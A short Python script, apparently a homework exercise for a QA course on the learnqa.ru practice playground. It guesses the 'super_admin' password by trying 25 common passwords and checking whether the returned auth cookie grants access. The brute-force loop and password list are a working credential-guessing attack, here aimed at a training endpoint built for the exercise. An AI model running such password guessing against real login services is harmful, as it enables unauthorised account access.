import requests

get_secret_url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_secret_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
login = 'super_admin'
password_list = ('123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111', '123123',
            'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777',
            'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe')

for password in password_list:
    data = {'login': login, 'password': password}
    response1 = requests.post(get_secret_url, data=data)
    if response1.status_code == 400:         # прерывание цикла, если с текущим логином авторизация невозможна
        print('Login does not exist!')
        break
    if 'auth_cookie' not in response1.cookies:  # пропуск цикла, если на текущий login/password не получен auth_cookie
        continue
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post(check_secret_url, cookies=cookies)
    if response2.text == 'You are authorized':    # завершение цикла в случае успеха (password найден)
        print('Пароль пользователя:', password)
        print('Cookie авторизации:', cookie_value)
        break